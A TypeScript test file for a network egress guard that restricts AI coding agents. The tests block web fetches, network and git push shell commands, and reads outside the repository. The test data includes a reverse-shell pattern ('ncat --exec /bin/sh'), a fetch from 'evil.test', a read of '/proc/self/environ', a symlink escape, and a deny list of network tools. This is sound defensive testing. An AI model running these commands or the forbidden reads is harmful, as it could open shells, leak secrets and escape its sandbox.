/**
 * Tests for the agent-worker network egress guard
 * (agent-worker/src/networkGuard.ts).
 *
 * Verifies that the Copilot permission handler denies web/URL fetches and
 * network/push shell commands while approving normal work, and that the Claude
 * disallow list covers the web tools and network/push shell commands.
 */

import { afterEach, describe, it, expect } from "vitest";
import { mkdtempSync, mkdirSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  NETWORK_DISALLOWED_TOOLS,
  createNativeReviewPermissionHandler,
  createReviewPermissionHandler,
  isBlockedNetworkCommand,
  restrictReviewPermissionHandler,
  restrictNetworkPermissionHandler,
} from "../../agent-worker/src/networkGuard.js";

/** Build a minimal shell permission request carrying a command string. */
function shellRequest(fullCommandText: string): Parameters<typeof restrictNetworkPermissionHandler>[0] {
  return { kind: "shell", fullCommandText } as unknown as Parameters<
    typeof restrictNetworkPermissionHandler
  >[0];
}

const invocation = { sessionId: "test-session" };

describe("networkGuard.isBlockedNetworkCommand", () => {
  it.each([
    "curl https://example.com",
    "wget http://evil.test/x",
    "nc 10.0.0.1 4444",
    "ncat --exec /bin/sh 10.0.0.1 4444",
    "netcat 10.0.0.1 4444",
    "telnet example.com 80",
    "ssh user@host",
    "scp file user@host:/tmp",
    "sftp user@host",
    "ftp example.com",
    "aria2c https://example.com/big",
    "lynx https://example.com",
    "links http://example.com",
    "git push origin HEAD",
    "git push --force origin main",
    "git fetch origin",
    "git pull",
    "git clone https://example.com/repo.git",
    "git ls-remote https://example.com/repo.git",
    "git remote-update",
    // Global git options before the remote subcommand must not bypass the guard.
    "git --no-pager fetch origin",
    "git -c http.sslVerify=false fetch origin",
    "git -C /workspace pull",
    "git --git-dir=/tmp/x.git clone https://example.com/repo.git",
    "git -c a=b -c c=d push origin main",
  ])("blocks %s", (cmd) => {
    expect(isBlockedNetworkCommand(cmd)).toBe(true);
  });

  it.each([
    "git commit -m 'work'",
    "git add -A",
    "git status",
    "git -c commit.gpgsign=false commit -m 'work'", // global option, local subcommand
    "git --no-pager log",
    "git -C /workspace status",
    "npm test",
    "ls -la",
    "cat README.md",
    "node build.js",
    "echo curling is fun", // substring, not the curl binary
  ])("allows %s", (cmd) => {
    expect(isBlockedNetworkCommand(cmd)).toBe(false);
  });
});

describe("networkGuard.restrictNetworkPermissionHandler", () => {
  it("rejects url (web fetch) requests", () => {
    const result = restrictNetworkPermissionHandler(
      { kind: "url" } as unknown as Parameters<typeof restrictNetworkPermissionHandler>[0],
      invocation,
    );
    expect(result).toEqual(
      expect.objectContaining({ kind: "reject" }),
    );
  });

  it("rejects shell commands that reach the network", () => {
    const result = restrictNetworkPermissionHandler(
      shellRequest("curl https://example.com"),
      invocation,
    );
    expect(result).toEqual(expect.objectContaining({ kind: "reject" }));
  });

  it("rejects git push", () => {
    const result = restrictNetworkPermissionHandler(
      shellRequest("git push origin HEAD:refs/for/main"),
      invocation,
    );
    expect(result).toEqual(expect.objectContaining({ kind: "reject" }));
  });

  it("reads the command from alternate fields (command / args)", () => {
    const viaCommand = restrictNetworkPermissionHandler(
      { kind: "shell", command: "curl https://example.com" } as unknown as Parameters<
        typeof restrictNetworkPermissionHandler
      >[0],
      invocation,
    );
    expect(viaCommand).toEqual(expect.objectContaining({ kind: "reject" }));

    const viaArgs = restrictNetworkPermissionHandler(
      { kind: "shell", args: ["git", "fetch", "origin"] } as unknown as Parameters<
        typeof restrictNetworkPermissionHandler
      >[0],
      invocation,
    );
    expect(viaArgs).toEqual(expect.objectContaining({ kind: "reject" }));
  });

  it("approves normal shell commands", () => {
    const result = restrictNetworkPermissionHandler(
      shellRequest("git commit -m 'fix'"),
      invocation,
    );
    expect(result).not.toEqual(expect.objectContaining({ kind: "reject" }));
  });

  it("approves file writes", () => {
    const result = restrictNetworkPermissionHandler(
      { kind: "write", fileName: "src/x.ts" } as unknown as Parameters<
        typeof restrictNetworkPermissionHandler
      >[0],
      invocation,
    );
    expect(result).not.toEqual(expect.objectContaining({ kind: "reject" }));
  });
});

describe("networkGuard.restrictReviewPermissionHandler", () => {
  const tempDirectories: string[] = [];

  afterEach(() => {
    for (const directory of tempDirectories.splice(0)) {
      rmSync(directory, { recursive: true, force: true });
    }
  });

  it.each(["shell", "write", "url", "memory", "hook", "custom-tool"])(
    "rejects %s requests",
    (kind) => {
      const result = restrictReviewPermissionHandler(
        { kind } as Parameters<typeof restrictReviewPermissionHandler>[0],
        invocation,
      );
      expect(result).toEqual(expect.objectContaining({ kind: "reject" }));
    },
  );

  it.each(["README.md", "src/index.ts"])("approves repository read %s", (requestedPath) => {
    const workspace = mkdtempSync(join(tmpdir(), "ve-review-workspace-"));
    tempDirectories.push(workspace);
    mkdirSync(join(workspace, "src"));
    writeFileSync(join(workspace, "README.md"), "read me");
    writeFileSync(join(workspace, "src/index.ts"), "export {};");
    const handler = createReviewPermissionHandler(workspace);

    const result = handler(
      { kind: "read", path: requestedPath } as unknown as Parameters<typeof handler>[0],
      invocation,
    );
    expect(result).not.toEqual(expect.objectContaining({ kind: "reject" }));
  });

  it("approves an absolute path inside the repository", () => {
    const workspace = mkdtempSync(join(tmpdir(), "ve-review-workspace-"));
    tempDirectories.push(workspace);
    const file = join(workspace, "README.md");
    writeFileSync(file, "read me");
    const handler = createReviewPermissionHandler(workspace);

    const result = handler(
      { kind: "read", path: file } as unknown as Parameters<typeof handler>[0],
      invocation,
    );

    expect(result).not.toEqual(expect.objectContaining({ kind: "reject" }));
  });

  it.each(["../outside.txt", "/proc/self/environ", "/workspace-escape/file"])(
    "rejects read outside the repository: %s",
    (requestedPath) => {
      const workspace = mkdtempSync(join(tmpdir(), "ve-review-workspace-"));
      tempDirectories.push(workspace);
      const handler = createReviewPermissionHandler(workspace);

      const result = handler(
        { kind: "read", path: requestedPath } as unknown as Parameters<typeof handler>[0],
        invocation,
      );

      expect(result).toEqual(expect.objectContaining({ kind: "reject" }));
    },
  );

  it("rejects read requests without a path", () => {
    const workspace = mkdtempSync(join(tmpdir(), "ve-review-workspace-"));
    tempDirectories.push(workspace);
    const handler = createReviewPermissionHandler(workspace);

    const result = handler(
      { kind: "read" } as Parameters<typeof handler>[0],
      invocation,
    );

    expect(result).toEqual(expect.objectContaining({ kind: "reject" }));
  });

  it("rejects repository symlinks that resolve outside the repository", () => {
    const workspace = mkdtempSync(join(tmpdir(), "ve-review-workspace-"));
    const outside = mkdtempSync(join(tmpdir(), "ve-review-outside-"));
    tempDirectories.push(workspace, outside);
    writeFileSync(join(outside, "secret"), "sensitive");
    symlinkSync(join(outside, "secret"), join(workspace, "linked-secret"));
    const handler = createReviewPermissionHandler(workspace);

    const result = handler(
      { kind: "read", path: "linked-secret" } as unknown as Parameters<typeof handler>[0],
      invocation,
    );

    expect(result).toEqual(expect.objectContaining({ kind: "reject" }));
  });

  it.each([
    ["ve-submission", "ve_submit_review"],
    ["virtual-engineer-submission", "ve_submit_review"],
    ["ve-submission", "ve-submission-ve_submit_review"],
  ])("approves the VE submission MCP identity %s/%s", (serverName, toolName) => {
    const approved = restrictReviewPermissionHandler(
      { kind: "mcp", serverName, toolName } as unknown as Parameters<
        typeof restrictReviewPermissionHandler
      >[0],
      invocation,
    );

    expect(approved).not.toEqual(expect.objectContaining({ kind: "reject" }));
  });

  it.each([
    ["other", "write_file"],
    ["ve-submission", "virtual-engineer-submission-ve_submit_review"],
    ["virtual-engineer-submission", "ve-submission-ve_submit_review"],
  ])("rejects unrelated MCP identity %s/%s", (serverName, toolName) => {
    const result = restrictReviewPermissionHandler(
      { kind: "mcp", serverName, toolName } as unknown as Parameters<
        typeof restrictReviewPermissionHandler
      >[0],
      invocation,
    );

    expect(result).toEqual(expect.objectContaining({ kind: "reject" }));
  });
});

describe("networkGuard native review delegation", () => {
  const handler = createNativeReviewPermissionHandler("/workspace");

  it("approves only a synchronous task delegation to code-review", () => {
    const approved = handler({
      kind: "custom-tool",
      toolName: "task",
      toolDescription: "Delegate review",
      args: { agent_type: "code-review", mode: "sync" },
    } as unknown as Parameters<typeof handler>[0], invocation);
    const wrongAgent = handler({
      kind: "custom-tool",
      toolName: "task",
      toolDescription: "Delegate research",
      args: { agent_type: "research", mode: "sync" },
    } as unknown as Parameters<typeof handler>[0], invocation);
    const background = handler({
      kind: "custom-tool",
      toolName: "task",
      toolDescription: "Delegate review",
      args: { agent_type: "code-review", mode: "background" },
    } as unknown as Parameters<typeof handler>[0], invocation);

    expect(approved).not.toEqual(expect.objectContaining({ kind: "reject" }));
    expect(wrongAgent).toEqual(expect.objectContaining({ kind: "reject" }));
    expect(background).toEqual(expect.objectContaining({ kind: "reject" }));
  });

  it("retains the review read and VE MCP restrictions", () => {
    const shell = handler({ kind: "shell" } as Parameters<typeof handler>[0], invocation);
    const otherTool = handler({
      kind: "custom-tool",
      toolName: "edit",
      toolDescription: "Edit files",
      args: {},
    } as unknown as Parameters<typeof handler>[0], invocation);

    expect(shell).toEqual(expect.objectContaining({ kind: "reject" }));
    expect(otherTool).toEqual(expect.objectContaining({ kind: "reject" }));
  });
});

describe("networkGuard.NETWORK_DISALLOWED_TOOLS (Claude)", () => {
  it("removes the web tools from the model context", () => {
    expect(NETWORK_DISALLOWED_TOOLS).toContain("WebFetch");
    expect(NETWORK_DISALLOWED_TOOLS).toContain("WebSearch");
  });

  it("blocks network and push shell commands via scoped Bash rules", () => {
    for (const rule of [
      "Bash(curl:*)",
      "Bash(wget:*)",
      "Bash(nc:*)",
      "Bash(ncat:*)",
      "Bash(netcat:*)",
      "Bash(telnet:*)",
      "Bash(ssh:*)",
      "Bash(scp:*)",
      "Bash(sftp:*)",
      "Bash(ftp:*)",
      "Bash(lynx:*)",
      "Bash(links:*)",
      "Bash(aria2c:*)",
      "Bash(git push:*)",
      "Bash(git fetch:*)",
      "Bash(git pull:*)",
      "Bash(git clone:*)",
      "Bash(git ls-remote:*)",
      "Bash(git remote-update:*)",
    ]) {
      expect(NETWORK_DISALLOWED_TOOLS).toContain(rule);
    }
  });
});
